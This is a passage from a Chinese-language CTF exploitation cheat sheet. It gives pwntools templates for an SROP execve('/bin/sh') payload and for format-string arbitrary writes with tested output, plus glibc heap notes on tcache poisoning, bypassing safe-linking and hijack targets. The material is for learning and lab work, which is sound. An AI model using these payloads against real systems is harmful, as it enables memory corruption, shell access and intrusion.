\NormalTok{frame }\OperatorTok{=}\NormalTok{ SigreturnFrame()            }\CommentTok{\# 產生 0xf8 bytes，就是核心會讀的那包}
\NormalTok{frame.rax }\OperatorTok{=} \DecValTok{59}                      \CommentTok{\# execve}
\NormalTok{frame.rdi }\OperatorTok{=}\NormalTok{ binsh                   }\CommentTok{\# 第 1 參數："/bin/sh" 的位址（可寫、可讀）}
\NormalTok{frame.rsi }\OperatorTok{=} \DecValTok{0}                       \CommentTok{\# argv = NULL}
\NormalTok{frame.rdx }\OperatorTok{=} \DecValTok{0}                       \CommentTok{\# envp = NULL}
\NormalTok{frame.rip }\OperatorTok{=}\NormalTok{ SYSCALL\_RET             }\CommentTok{\# 還原後要執行的位址：放「syscall」那一條指令}
                                    \CommentTok{\#   最好只含 syscall（execve 成功就換行程了，後面接什麼都不會被執行；}
                                    \CommentTok{\#   若它剛好是 \textasciigrave{}syscall; ret\textasciigrave{}——像 pwn1 的 0x401069——也一樣可用）}
\NormalTok{frame.rsp }\OperatorTok{=}\NormalTok{ binsh }\OperatorTok{+} \BaseNTok{0x200}           \CommentTok{\# 必須是「合法且可寫」的位址，且建議 16{-}byte 對齊}
                                    \CommentTok{\#   （execve 成功就用不到它；失敗時才會踩到）}

\NormalTok{payload  }\OperatorTok{=} \StringTok{b\textquotesingle{}A\textquotesingle{}} \OperatorTok{*}\NormalTok{ offset}
\NormalTok{payload }\OperatorTok{+=}\NormalTok{ p64(READ\_AGAIN)   }\CommentTok{\# 再來一次 read {-}\textgreater{} 這次只送 15 bytes，讓 rax = 讀到的長度 = 15}
\NormalTok{payload }\OperatorTok{+=}\NormalTok{ p64(SYSCALL\_RET)  }\CommentTok{\# 這次 read 的 ret {-}\textgreater{} syscall 指令}
\NormalTok{payload }\OperatorTok{+=} \BuiltInTok{bytes}\NormalTok{(frame)      }\CommentTok{\# frame 必須剛好落在當時的 rsp（就是 SYSCALL\_RET 被彈掉之後的位置）}
\CommentTok{\# 然後送出「剛好 15 bytes」讓 rax = 15（= \_\_NR\_rt\_sigreturn，SROP 的 syscall 編號，見 00 §7）}
\CommentTok{\# → syscall 執行 rt\_sigreturn → 核心從 rsp 讀走 frame → 所有暫存器變成上面設的值 → execve("/bin/sh")}
\end{Highlighting}
\end{Shaded}

\begin{quote}
※提示 \textbf{為什麼要「剛好 15 bytes」？} SROP 靠的是「\texttt{rax}
的值決定要做哪個 syscall」。 我們先用一次 \texttt{read} 把 \texttt{rax}
設成「實際讀到的長度」，而 \texttt{rt\_\allowbreak{}sigreturn} 的編號正好是
\textbf{15}， 所以只要讓 \texttt{read} 讀到 15 個 byte，接下來的
\texttt{syscall} 就會變成 \texttt{rt\_\allowbreak{}sigreturn}。 （同理：\texttt{read}
讀到幾個 byte 就決定了下一次 syscall 是什麼 ------ 這也是 SROP
常被拿來當「一次設好所有暫存器」的原因。） 完整的推導與 gdb 追蹤見
\texttt{../\allowbreak{}pwn1/\allowbreak{}notes.\allowbreak{}md} §5、§6。
\end{quote}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{7. Format String 模板}\label{format-string-ux6a21ux677f}

\begin{quote}
※注意 \textbf{動手前先設
\texttt{context.\allowbreak{}arch\ \allowbreak{}=\ \allowbreak{}\textquotesingle{}\allowbreak{}amd64\textquotesingle{}\allowbreak{}}}：沒設的話
pwntools 預設是 32-bit（\texttt{context.\allowbreak{}bytes\ \allowbreak{}=\ \allowbreak{}4}）， 它會用
\textbf{4-byte} 對齊去算 \texttt{\%\allowbreak{}N\$\allowbreak{}hn} 的參數編號 → payload
看起來很合理但\textbf{一定寫錯位址}（實測 SIGSEGV）。 64-bit 的
\texttt{\$\allowbreak{}} 參數是 8 bytes 一格，這行一定要有。
\end{quote}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# 找 offset（\%N$p 掃描）；印出「你的輸入」是第幾個參數}
\ControlFlowTok{for}\NormalTok{ i }\KeywordTok{in} \BuiltInTok{range}\NormalTok{(}\DecValTok{1}\NormalTok{, }\DecValTok{30}\NormalTok{):}
\NormalTok{    p.sendline((}\StringTok{\textquotesingle{}\%}\SpecialCharTok{\{\}}\StringTok{$p\textquotesingle{}}\NormalTok{.}\BuiltInTok{format}\NormalTok{(i)).encode())}
    \BuiltInTok{print}\NormalTok{(i, p.recvline())}

\CommentTok{\# 任意位址任意值寫入}
\ImportTok{from}\NormalTok{ pwn }\ImportTok{import}\NormalTok{ fmtstr\_payload}
\NormalTok{payload }\OperatorTok{=}\NormalTok{ fmtstr\_payload(offset, \{target\_addr: value\}, write\_size}\OperatorTok{=}\StringTok{\textquotesingle{}short\textquotesingle{}}\NormalTok{)}
\CommentTok{\# offset = 你的輸入開頭在 printf 參數中的位置（1{-}based，就是上面掃到的那個編號）}
\CommentTok{\#   → 必須跟掃描結果一致：offset=N{-}1 或 N+1 都會直接 SIGSEGV（實測）}
\end{Highlighting}
\end{Shaded}

\paragraph{\texorpdfstring{7.1 掃完 30 行
hex，\textbf{哪一行才是「我」}？}{7.1 掃完 30 行 hex，哪一行才是「我」？}}\label{ux6383ux5b8c-30-ux884c-hexux54eaux4e00ux884cux624dux662fux6211}

印出一堆 \texttt{0x…} 之後，新手通常說不出「哪個是我」。兩種認法：

\textbf{① 標記法（最可靠）}：在格式字串\textbf{最前面}放 8 bytes
好認的標記，然後找那個標記：

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{io.sendline(}\StringTok{b\textquotesingle{}AAAABBBB.\textquotesingle{}} \OperatorTok{+} \StringTok{b\textquotesingle{}.\textquotesingle{}}\NormalTok{.join(}\StringTok{b\textquotesingle{}\%p\textquotesingle{}} \ControlFlowTok{for}\NormalTok{ \_ }\KeywordTok{in} \BuiltInTok{range}\NormalTok{(}\DecValTok{16}\NormalTok{)))}
\CommentTok{\# 在輸出裡找 \textasciigrave{}0x4242424241414141\textasciigrave{}（= 小端的 "AAAABBBB"）}
\CommentTok{\#   印出它的那一格，序號就是「buf[0] 是第幾個參數」}
\end{Highlighting}
\end{Shaded}

實測輸出（本機自己編的 \texttt{printf(buf)}
小程式；\textbf{位址每次執行都不同，看結構就好}）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
AAAABBBB.0x1c9c0011.0x7fff240cff10.0x7f1675218760.0x1c9c0049.(nil).0x4242424241414141.0x252e70252e70252e...
         ^^^^^^^^^^ ^^^^^^^^^^^^^^ ^^^^^^^^^^^^^^ ^^^^^^^^^^ ^^^^^ ^^^^^^^^^^^^^^^^^^
         %1$p       %2$p           %3$p           %4$p       %5$p  %6$p  ← 就是 buf[0]
\end{Verbatim}

（\texttt{\%\allowbreak{}1\$\allowbreak{}}～\texttt{\%\allowbreak{}5\$\allowbreak{}} 印的是暫存器殘值 / 堆疊位址 / libc 位址
/ 程式位址 / \texttt{nil}， \textbf{只有 \texttt{\%\allowbreak{}6\$\allowbreak{}p}
是我們親手放的標記}。）

\textbf{②
直接編號法}：\texttt{b\textquotesingle{}\allowbreak{}\ \allowbreak{}\textquotesingle{}\allowbreak{}.\allowbreak{}join(b\textquotesingle{}\allowbreak{}\%\allowbreak{}\%\allowbreak{}\%\allowbreak{}d\$\allowbreak{}p\textquotesingle{}\allowbreak{}\ \allowbreak{}\%\allowbreak{}\ \allowbreak{}i\ \allowbreak{}for\ \allowbreak{}i\ \allowbreak{}in\ \allowbreak{}range(1,\allowbreak{}\ \allowbreak{}21))}
------ 注意每一格的\textbf{位置}：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
%1$p %2$p %3$p %4$p %5$p %6$p %7$p ...
→   0x1c9c0049 0x7fff240cff10 0x7f1675218760 0x1c9c00b8 (nil) 0x2432252070243125 0x2520702433252070 ...
\end{Verbatim}

第 6 格印出 \texttt{0x2432252070243125}（= \texttt{\%\allowbreak{}1\$\allowbreak{}p\ \allowbreak{}\%\allowbreak{}2\$\allowbreak{}}
這幾個字元的 bytes，小端）→ \textbf{那一格就是我的 \texttt{buf}
開頭}（也就是\textbf{格式字串自己}）。這是「認出自己」最快的方法：\textbf{你的輸入一定會出現在某一格}。

\begin{quote}
※提示 \textbf{為什麼第 6 個才輪到 \texttt{buf}？} \texttt{printf(buf)}
的第一個參數（\texttt{rdi}）是\textbf{格式字串本身}，
可變參數從下一個暫存器開始：\textbf{第 1～5 個參數是
\texttt{rsi}、\texttt{rdx}、\texttt{rcx}、\texttt{r8}、\texttt{r9}}，
\textbf{第 6 個以後才從堆疊上取}。而 \texttt{buf} 就躺在呼叫者的堆疊上 →
所以 \texttt{buf{[}0{]}} 通常落在 第 6 個附近（本系列 pwn2 是第
\textbf{8} 個，因為 \texttt{main} 的堆疊格局不同）。
\textbf{不要背數字，一律實測}；量出來的那個編號就是
\texttt{fmtstr\_\allowbreak{}payload} 的 \texttt{offset}。
\end{quote}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
參數
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
說明
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{offset} & 你的輸入開頭是第幾個參數（1-based）。\textbf{不要
±1}，掃到幾就填幾 \\
\texttt{write\_\allowbreak{}size=\textquotesingle{}\allowbreak{}byte\textquotesingle{}\allowbreak{}} &
\textbf{最小}寫入單位（預設
\texttt{\textquotesingle{}\allowbreak{}byte\textquotesingle{}\allowbreak{}}）：允許 pwntools 用
\texttt{\%\allowbreak{}hhn} 這種一次寫 1 byte 的寫法 \\
\texttt{write\_\allowbreak{}size=\textquotesingle{}\allowbreak{}short\textquotesingle{}\allowbreak{}} &
最小寫入單位改成 2 bytes（\texttt{\%\allowbreak{}hn}），payload
短一半；值很大時比較省 \\
\texttt{write\_\allowbreak{}size\_\allowbreak{}max=\textquotesingle{}\allowbreak{}long\textquotesingle{}\allowbreak{}} &
\textbf{最大}寫入單位（預設
\texttt{\textquotesingle{}\allowbreak{}long\textquotesingle{}\allowbreak{}}）：pwntools
會把相鄰的寫入\textbf{合併}成 \texttt{\%\allowbreak{}hn} / \texttt{\%\allowbreak{}n} 以縮短
payload \\
\texttt{badbytes=b\textquotesingle{}\allowbreak{}\textbackslash{}\allowbreak{}n\textquotesingle{}\allowbreak{}}
& 目標用 \texttt{fgets()} 收輸入時必加，否則 payload 會被截斷 \\
\texttt{numbwritten=N} & printf 在讀到你的輸入\textbf{之前}已經印過 N
個字元時要填（例如 \texttt{printf("name:\allowbreak{}\ \allowbreak{}\%\allowbreak{}s",\allowbreak{}\ \allowbreak{}buf)}） \\
\end{longtable}
}

\begin{quote}
※注意 \textbf{最常搞混的一點}：\texttt{write\_\allowbreak{}size}
是\textbf{下限}、\texttt{write\_\allowbreak{}size\_\allowbreak{}max} 是\textbf{上限}，
兩個是獨立參數。只寫
\texttt{write\_\allowbreak{}size=\textquotesingle{}\allowbreak{}byte\textquotesingle{}\allowbreak{}}
\textbf{不代表}一定用 \texttt{\%\allowbreak{}hhn} ------ 因為
\texttt{write\_\allowbreak{}size\_\allowbreak{}max} 預設是
\texttt{\textquotesingle{}\allowbreak{}long\textquotesingle{}\allowbreak{}}，pwntools
還是可能把相鄰位元組\textbf{合併}成 \texttt{\%\allowbreak{}hn}（2 bytes）甚至
\texttt{\%\allowbreak{}n}（4 bytes）以縮短 payload。

如果你\textbf{堅持每個 byte 都用
\texttt{\%\allowbreak{}hhn}}（例如目標位址之間剛好有不能碰的 byte）， 必須兩個都寫：

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{fmtstr\_payload(off, \{addr: val\}, write\_size}\OperatorTok{=}\StringTok{\textquotesingle{}byte\textquotesingle{}}\NormalTok{, write\_size\_max}\OperatorTok{=}\StringTok{\textquotesingle{}byte\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

判斷 pwntools 最後用了哪一種，最簡單的方法是\textbf{把產生的 payload
印出來看}：

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{print}\NormalTok{(payload)      }\CommentTok{\# 看到 \%17$n 就是 4{-}byte 寫、看到 \%17$hhn 就是 1{-}byte 寫}
\end{Highlighting}
\end{Shaded}

本系列 pwn2 的 payload 就是印出來確認過的（實測會依版本/對齊出現
\texttt{\%\allowbreak{}hhn} 或 \texttt{\%\allowbreak{}hn}）。
\end{quote}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}ll@{}}
\toprule\noalign{}
格式 & 意義 \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{\%\allowbreak{}p} & 印出一個指標 \\
\texttt{\%\allowbreak{}N\$\allowbreak{}p} & 印出第 N 個參數（1-based） \\
\texttt{\%\allowbreak{}N\$\allowbreak{}s} & 把第 N
個參數當成\textbf{指標}，印出它指向的字串（任意位址讀） \\
\texttt{\%\allowbreak{}n} & \textbf{把「目前印出的字元數」寫入對應的指標}（4
bytes） \\
\texttt{\%\allowbreak{}hn} & 同上，寫 2 bytes \\
\texttt{\%\allowbreak{}hhn} & 同上，寫 1 byte \\
\texttt{\%\allowbreak{}\textless{}\allowbreak{}寬度\textgreater{}\allowbreak{}c} & 補空白到指定寬度（用來控制
\texttt{\%\allowbreak{}n} 的值） \\
\end{longtable}
}

\begin{quote}
\texttt{\%\allowbreak{}n}
的參數是\textbf{指標}，要把它指向目標位址。目標位址必須躺在堆疊上、而且能被
\texttt{\%\allowbreak{}N\$\allowbreak{}} 讀到。

※注意 \textbf{排版順序很重要}：\texttt{printf} 讀到
\texttt{\textbackslash{}\allowbreak{}x00} 就停，所以\textbf{位址不能放在 payload
最前面} （\texttt{p64(0x404028)} 的第 4 個 byte 就是
\texttt{\textbackslash{}\allowbreak{}x00} → 後面的 \texttt{\%\allowbreak{}9\$\allowbreak{}hn}
根本不會被執行，實測就是這樣）。
正確順序是：\textbf{格式字串（\texttt{\%\allowbreak{}…c\%\allowbreak{}N\$\allowbreak{}hn}）→ 補齊到 8 的倍數 →
目標位址}。 \texttt{fmtstr\_\allowbreak{}payload()} 幫你排好並算好
\texttt{N}，所以優先用它；自己手刻時最容易死在這個順序上。
\end{quote}

\begin{quote}
※實測 \textbf{實測}（本機自己編的小程式，\texttt{printf(buf)}
迴圈、\texttt{buf} 在第 6 個參數）：
\texttt{fmtstr\_\allowbreak{}payload(6,\allowbreak{}\ \allowbreak{}\{\allowbreak{}secret:\allowbreak{}\ \allowbreak{}0xdeadbeef\}\allowbreak{},\allowbreak{}\ \allowbreak{}write\_\allowbreak{}size=\textquotesingle{}\allowbreak{}short\textquotesingle{}\allowbreak{})}
→ \texttt{secret\ \allowbreak{}=\ \allowbreak{}0xdeadbeef} ✓； 同一個 payload 改成
\texttt{offset=5} 或 \texttt{offset=7} → SIGSEGV ✗；不設
\texttt{context.\allowbreak{}arch} → 也 SIGSEGV ✗。
\end{quote}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{8. glibc heap 極簡版（pwn4
用）}\label{glibc-heap-ux6975ux7c21ux7248pwn4-ux7528}

\begin{quote}
※注意 \textbf{本節是「速查表」，不是教學。} 如果你是\textbf{第一次}碰
heap，請先讀 \texttt{../\allowbreak{}pwn4/\allowbreak{}notes.\allowbreak{}md} §5.1～§5.4（從零講、有圖、有 gdb
實測），\textbf{再}回來查本節。
直接從這裡開始讀，你會連續撞到沒有解釋的名詞。
\end{quote}

\textbf{真正的入門三句話（先看這三句，其餘欄位名第一輪讀不懂是正常的，看到就跳過）：}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \texttt{malloc(n)} 給你的是一塊\textbf{前面帶 8+8 bytes
  標頭}的記憶體，這個單位叫 \textbf{chunk} → \texttt{malloc()}
  回傳的指標 = \textbf{標頭位址 + 0x10}（這段才叫 \textbf{user
  data}，你能寫的範圍）。
\item
  \texttt{free()} 之後 glibc
  會把整塊塞進某個\textbf{回收桶（bin）}，桶依大小分類， 最常用的是
  \textbf{tcache}（每種大小最多放 7 塊、\textbf{後進先出}）。
\item
  \texttt{malloc()}
  會\textbf{先從桶裡拿}（桶空才去跟核心要新記憶體）------所以只要能改掉桶裡的
  \textbf{連結資訊}，就能讓下一次 \texttt{malloc()}
  回傳\textbf{你指定的位址}，這就叫 \textbf{tcache
  poisoning（＝任意位址寫）}。\texttt{pwn4} 整題就是在做這件事。
\end{enumerate}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
chunk 結構（allocated 時）：
  +0x00  prev_size        （前一個 chunk 還在用時，這 8 bytes 被前一個 chunk 的資料借走）
  +0x08  size             （含 flag bits；最小 0x20，16-byte 對齊）
  +0x10  user data        ← malloc() 回傳的指標就是這裡（chunk + 0x10）

chunk 結構（free 之後，user data 的前 16 bytes 變成連結資訊）：
  +0x00  prev_size
  +0x08  size | flags     (PREV_INUSE=1, IS_MMAPPED=2, NON_MAIN_ARENA=4)
  +0x10  fd               （＝「下一個」空閒 chunk；tcache 裡叫 next）
  +0x18  bk               （＝「上一個」；只有雙向鏈的 bin 才用；tcache 裡這格是 key）
\end{Verbatim}

\begin{quote}
※提示 \textbf{\texttt{fd} / \texttt{bk} 是什麼}：\texttt{fd} =
forward（往前指）、\texttt{bk} = backward（往後指）------
就是「鏈結串列的下一個 / 上一個」。\textbf{只有被 free 的 chunk
才有意義}（活著的 chunk 那 16 bytes 是普通資料）。tcache
是\textbf{單向}鏈，所以只用到 \texttt{fd}（在那裡叫 \texttt{next}）。
\end{quote}

\begin{quote}
※提示 \textbf{\texttt{size} 欄位尾端的 3 個 bit}：\texttt{size} 一定是
16 的倍數，最低 3 bits 空著， 就被借去當旗標 ------
\texttt{PREV\_\allowbreak{}INUSE}（前一個 chunk
還在用）、\texttt{IS\_\allowbreak{}MMAPPED}（這塊是 \texttt{mmap} 來的，不在 heap
上）、\texttt{NON\_\allowbreak{}MAIN\_\allowbreak{}ARENA}（屬於執行緒自己的 arena）。
\textbf{平常不用背}，只有在「glibc 檢查 size
合不合法」相關的攻擊手法（如 House of 系列）
才需要精確知道（完整解釋：\texttt{pwn4} §5.2）。
\end{quote}

\begin{quote}
※提示 \textbf{bin 的種類（一句話版）}：
\texttt{tcache}（最快、每種大小最多 7 塊）→ 滿了之後掉到
\texttt{fastbin}（小塊、單向鏈）／
\texttt{unsorted\ \allowbreak{}bin}（\textbf{不是}「亂放」------它是「還沒決定要放哪」的中轉站，\texttt{fd}/\texttt{bk}
會指回 libc 的 \texttt{main\_\allowbreak{}arena}，所以\textbf{是 libc base
洩漏的經典來源}）→
\texttt{small\ \allowbreak{}bin}（\texttt{0x90}～\texttt{0x3f0}）／
\texttt{large\ \allowbreak{}bin}（\texttt{\textgreater{}\allowbreak{}=\ \allowbreak{}0x400}，會排序）。完整說明：\texttt{pwn4}
§5.5。
\end{quote}

\begin{itemize}
\tightlist
\item
  \texttt{malloc(0x18)} 實際會拿到 \texttt{0x20} 的 chunk（最小
  \texttt{0x20}，16-byte 對齊）
\item
  \texttt{tcache}（glibc ≥ 2.26）：per-size 的單向
  bin，\textbf{LIFO}，每個 size 最多 7 個
\item
  \texttt{safe-\allowbreak{}linking}（glibc ≥ 2.32）：tcache 的 \texttt{next}
  欄位存的不是明文，而是
  \textbf{\texttt{stored\ \allowbreak{}=\ \allowbreak{}ptr\ \allowbreak{}\^\allowbreak{}{}\allowbreak{}\ \allowbreak{}((u64)\&\allowbreak{}e-\allowbreak{}\textgreater{}\allowbreak{}next\ \allowbreak{}\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}12)}}（\texttt{ptr}
  ＝ 真正要存的下一個位址）。 \textgreater{} ※ \textbf{這裡的 XOR key 是
  \texttt{\&\allowbreak{}e-\allowbreak{}\textgreater{}\allowbreak{}next}}（＝「這個 \texttt{next}
  欄位自己所在的位址」）。 \textgreater{} 對「一條鏈的第一塊」來說
  \texttt{e-\allowbreak{}\textgreater{}\allowbreak{}next} 正好落在 user data 開頭，所以 key 就是
  \textgreater{} \textbf{user 位址
  \texttt{\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}12}}（在 tcache 裡
  \texttt{user\ \allowbreak{}位址\ \allowbreak{}=\ \allowbreak{}chunk\ \allowbreak{}標頭\ \allowbreak{}+\ \allowbreak{}0x10}）------ \textgreater{}
  \textbf{不是 chunk 標頭位址}。兩者差
  \texttt{0x10}，\texttt{\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}12}
  後只在\textbf{跨 4 KB 頁}時不同（實測見下）。 \textgreater{} 為什麼是
  \texttt{\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}12}？因為 ASLR 以 \textbf{4
  KB（\texttt{2\^\allowbreak{}{}\allowbreak{}12}）頁}為單位隨機化，高位 bits 本來就猜得到，
  \textgreater{} glibc 索性拿它當「免費的金鑰」。

  \begin{itemize}
  \tightlist
  \item
    \textbf{只用得到
    \texttt{user\ \allowbreak{}位址\ \allowbreak{}\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}12}（高位），不需要完整位址！}
    → 只要洩漏這個 key （最簡單的方法：free 到「空鏈」時
    \texttt{stored\ \allowbreak{}=\ \allowbreak{}key\ \allowbreak{}\^\allowbreak{}{}\allowbreak{}\ \allowbreak{}NULL\ \allowbreak{}=\ \allowbreak{}user\ \allowbreak{}\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}12}）就能偽造
    \texttt{fd}， 這就是 pwn4 flag「safe-linking 擋不住
    tcache」的意思（見 \texttt{../\allowbreak{}pwn4/\allowbreak{}notes.\allowbreak{}md} §5.4）
  \item
    \textbf{它防的是什麼}：讓「\textbf{拿到 UAF／溢寫、但不知道任何 heap
    位址}」的人無法偽造 \texttt{fd} （不知道 key →
    存進去的解密結果是垃圾位址 → \texttt{malloc} abort），
    也就是讓「盲打 tcache poisoning」和「只改 \texttt{fd} 低 1 byte 的
    partial overwrite」失效。 ⇒ 攻擊前提變成「\textbf{必須先洩漏一次
    heap 位址}」，而那正是 pwn4 做的事。
  \end{itemize}
\item
  \textbf{現代 glibc（2.32+）三個必知細節}：

  \begin{itemize}
  \tightlist
  \item
    \texttt{tcache-\allowbreak{}\textgreater{}\allowbreak{}entries{[}{]}}（bin
    頭）存的是\textbf{明文} user 位址（不用解碼）；只有 chunk 內的
    \texttt{next} 才編碼；
  \item
    \texttt{tcache\_\allowbreak{}get()} 有 \textbf{\texttt{aligned\_\allowbreak{}OK(e)}} 檢查
    ------ 這是 glibc 在 \texttt{malloc} 從桶裡拿東西時的 「位址必須
    \textbf{16-byte
    對齊}」檢查（\texttt{((uintptr\_\allowbreak{}t)e\ \allowbreak{}\&\allowbreak{}\ \allowbreak{}0xf)\ \allowbreak{}==\ \allowbreak{}0}）→
    毒化目標不對齊會 abort；
  \item
    \texttt{tcache\_\allowbreak{}put()} 的寫入順序是
    \texttt{key\ \allowbreak{}→\ \allowbreak{}next\ \allowbreak{}→\ \allowbreak{}entries\ \allowbreak{}→\ \allowbreak{}counts}（順序會影響「double
    free 前要先清掉什麼」）。
  \end{itemize}
\item
  \textbf{同一格欄位在不同 bin
  有不同名字}：\texttt{+0x10}/\texttt{+0x18} 在 tcache 叫
  \texttt{next}/\texttt{key}， 在 unsorted/small/large bin 叫
  \texttt{fd}/\texttt{bk}；fastbin 只用到 \texttt{+0x10} 的
  \texttt{fd}。（三處筆記都對，只是語意不同。）
\item
  \texttt{\_\allowbreak{}\_\allowbreak{}free\_\allowbreak{}hook} / \texttt{\_\allowbreak{}\_\allowbreak{}malloc\_\allowbreak{}hook} 在 \textbf{glibc ≥
  2.34 已不再被呼叫}（符號留著只為 ABI 相容） → 現代 glibc 要打
  \textbf{\texttt{exit} 的 hook / \texttt{\_\allowbreak{}IO\_\allowbreak{}2\_\allowbreak{}1\_\allowbreak{}stdout\_\allowbreak{}} /
  \texttt{environ} / 返回位址}
\item
  \textbf{這三個名字是什麼？}

  \begin{itemize}
  \tightlist
  \item
    \texttt{\_\allowbreak{}\_\allowbreak{}free\_\allowbreak{}hook} /
    \texttt{\_\allowbreak{}\_\allowbreak{}malloc\_\allowbreak{}hook}：以前的「全域函式指標」，\texttt{free()} /
    \texttt{malloc()} 時會被呼叫 → 改成 \texttt{system}
    就等於劫持控制流。 （\textbf{glibc ≥ 2.34 的 malloc/free
    已經不再呼叫它們}；\texttt{libc.\allowbreak{}so.\allowbreak{}6} 的 \texttt{.\allowbreak{}dynsym}
    裡雖然還留著 這兩個 8-byte 的 compat 符號（version
    \texttt{GLIBC\_\allowbreak{}2.\allowbreak{}2.\allowbreak{}5}），\textbf{但改它沒有任何效果}。）
  \item
    \texttt{\_\allowbreak{}IO\_\allowbreak{}2\_\allowbreak{}1\_\allowbreak{}stdout\_\allowbreak{}}：libc 裡的 \texttt{FILE}
    結構（\texttt{stdout} 指向它）。改它的 \texttt{\_\allowbreak{}flags} /
    \texttt{\_\allowbreak{}IO\_\allowbreak{}write\_\allowbreak{}base} 等欄位 → 下一次
    \texttt{puts}/\texttt{printf}
    會把「不該印的記憶體」印出來（\textbf{House of Apple / FSOP}
    就是用這個拿 shell）。 \textgreater{} ※提示 \textbf{FSOP
    是什麼}：\textbf{F}ile \textbf{S}tream \textbf{O}riented
    \textbf{P}rogramming 的縮寫 ------ \textgreater{}
    「不劫持返回位址，而是\textbf{偽造一個 \texttt{FILE} 結構}，讓 glibc
    自己去呼叫裡面的函式指標」 \textgreater{}
    的攻擊家族（\texttt{House\ \allowbreak{}of\ \allowbreak{}Apple}
    是其中最有名的一招）。這是\textbf{進階題材}，本系列沒用到，
    \textgreater{} 看到名詞知道它在講什麼就好。
  \item
    \texttt{environ}：libc 裡存「\textbf{堆疊位址}」的全域變數 →
    洩漏它就能反推 \texttt{stack} 在哪（有 stack pivot /
    需要寫回傳位址時很好用）。
  \end{itemize}
\item
  \textbf{hook 是什麼？} glibc 內部「在特定時機會去呼叫的函式指標」。
  例如 \texttt{\_\allowbreak{}\_\allowbreak{}free\_\allowbreak{}hook} 會在 \texttt{free()}
  時被呼叫，所以只要把它改成 \texttt{system}， 之後
  \texttt{free("/\allowbreak{}bin/\allowbreak{}sh")} 就變成 \texttt{system("/\allowbreak{}bin/\allowbreak{}sh")} ------
  等於劫持控制流。 （glibc 2.34 之後這些 hook
  已不再被呼叫，所以現代題目改打上面列的其他目標。）
\end{itemize}

\paragraph{\texorpdfstring{8.1 實測：safe-linking 的 key 是 \textbf{user
位址}，不是 chunk
標頭}{8.1 實測：safe-linking 的 key 是 user 位址，不是 chunk 標頭}}\label{ux5be6ux6e2csafe-linking-ux7684-key-ux662f-user-ux4f4dux5740ux4e0dux662f-chunk-ux6a19ux982d}

上面「\texttt{\&\allowbreak{}e-\allowbreak{}\textgreater{}\allowbreak{}next} ≡ user
位址」這句是本節最容易算錯的地方（兩者差 \texttt{0x10}），所以直接量
（下面是\textbf{節錄}，完整可編譯的程式在 \texttt{../\allowbreak{}pwn4/\allowbreak{}notes.\allowbreak{}md}
§5.4）：

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{/* 讓一個 chunk 的 user 位址剛好落在 4 KB 邊界上（這樣「標頭」會落在上一頁） */}
\ControlFlowTok{for} \OperatorTok{(}\DataTypeTok{int}\NormalTok{ i }\OperatorTok{=} \DecValTok{0}\OperatorTok{;}\NormalTok{ i }\OperatorTok{\textless{}} \DecValTok{400}\OperatorTok{;}\NormalTok{ i}\OperatorTok{++)} \OperatorTok{\{}
\NormalTok{    p}\OperatorTok{[}\NormalTok{i}\OperatorTok{]} \OperatorTok{=}\NormalTok{ malloc}\OperatorTok{(}\BaseNTok{0x80}\OperatorTok{);}
    \ControlFlowTok{if} \OperatorTok{((}\DataTypeTok{uint64\_t}\OperatorTok{)}\NormalTok{p}\OperatorTok{[}\NormalTok{i}\OperatorTok{]} \OperatorTok{\%} \BaseNTok{0x1000} \OperatorTok{==} \DecValTok{0} \OperatorTok{\&\&}\NormalTok{ target }\OperatorTok{\textless{}} \DecValTok{0}\OperatorTok{)}\NormalTok{ target }\OperatorTok{=}\NormalTok{ i}\OperatorTok{;}
\OperatorTok{\}}
\NormalTok{free}\OperatorTok{(}\NormalTok{p}\OperatorTok{[}\NormalTok{target}\OperatorTok{]);}                                   \CommentTok{/* 丟進「空的」tcache 鏈 */}
\DataTypeTok{uint64\_t}\NormalTok{ stored }\OperatorTok{=} \OperatorTok{*(}\DataTypeTok{uint64\_t} \OperatorTok{*)}\NormalTok{p}\OperatorTok{[}\NormalTok{target}\OperatorTok{];}
\NormalTok{printf}\OperatorTok{(}\StringTok{"stored      = }\SpecialCharTok{\%\#018lx\textbackslash{}n}\StringTok{"}\OperatorTok{,}\NormalTok{ stored}\OperatorTok{);}
\NormalTok{printf}\OperatorTok{(}\StringTok{"user   \textgreater{}\textgreater{}12 = }\SpecialCharTok{\%\#018lx\textbackslash{}n}\StringTok{"}\OperatorTok{,} \OperatorTok{(}\DataTypeTok{uint64\_t}\OperatorTok{)}\NormalTok{p}\OperatorTok{[}\NormalTok{target}\OperatorTok{]} \OperatorTok{\textgreater{}\textgreater{}} \DecValTok{12}\OperatorTok{);}
